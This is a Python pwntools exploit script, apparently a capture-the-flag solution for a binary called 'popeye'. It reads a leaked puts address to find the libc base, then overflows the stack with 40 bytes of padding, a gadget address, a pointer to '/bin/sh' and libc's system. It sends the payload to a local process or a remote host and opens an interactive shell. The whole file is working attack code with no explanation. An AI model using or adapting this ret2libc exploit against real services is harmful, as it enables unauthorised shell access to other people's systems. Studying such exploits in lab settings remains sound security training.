#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

elf = context.binary = ELF("./popeye")
io = remote(sys.argv[1], int(sys.argv[2])
	) if args.REMOTE else process()
libc = ELF("./libc.so.6")

io.recvuntil(b": ")
libc.address = int(io.recvuntil(b"]")[:-1], 16) - libc.sym.puts
info("libc @ %#x" % libc.address)
payload = flat(
	cyclic(40, n=8),
	0x0000000000400944,
	next(libc.search(b"/bin/sh\x00")),
	libc.sym.system
)

io.sendline(payload)
io.interactive()
